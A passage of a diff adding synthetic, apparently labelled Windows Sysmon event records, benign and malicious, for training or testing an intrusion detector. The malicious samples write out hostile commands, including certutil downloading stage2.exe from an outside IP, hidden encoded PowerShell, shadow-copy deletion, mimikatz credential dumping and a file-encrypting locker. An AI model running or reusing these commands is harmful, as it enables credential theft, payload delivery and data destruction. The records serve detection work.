+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Users\\Public\\locker.exe",
+    "CommandLine": "locker.exe /encrypt C:\\Finance\\ /key abc123",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 8,
+    "SourceImage": "C:\\Windows\\System32\\powershell.exe",
+    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
+    "StartFunction": "NtCreateThread",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://185.220.101.45/stage2.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcA",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 1
+  },
+  {
+    "EventID": 10,
+    "SourceImage": "C:\\Windows\\System32\\cmd.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 7,
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ImageLoaded": "C:\\Users\\Temp\\evil.dll",
+    "Signed": false,
+    "User": "CORP\\alice",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Users\\Public\\loader.exe",
+    "DestinationIp": "185.220.101.45",
+    "DestinationPort": 4444,
+    "User": "CORP\\finance1",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+    "CommandLine": "mimikatz sekurlsa::logonpasswords exit",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "Hashes": "MD5=DEADBEEF",
+    "Signed": false,
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 3,
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "DestinationIp": "8.8.8.8",
+    "DestinationPort": 443,
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "CommandLine": "svchost.exe -k netsvcs -p -s BITS",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Hashes": "MD5=ABC123",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\report.txt",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "User": "CORP\\alice",
+    "Signed": true,
+    "_label": 0
+  },
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin delete shadows /all /quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\finance1",
+    "_label": 1
+  },
+  {
+    "EventID": 11,
+    "Image": "C:\\Windows\\System32\\svchost.exe",
+    "TargetFilename": "C:\\Windows\\Prefetch\\CHROME.EXE-ABC12345.pf",
+    "User": "SYSTEM",
+    "_label": 0
+  },
+  {
+    "EventID": 1,
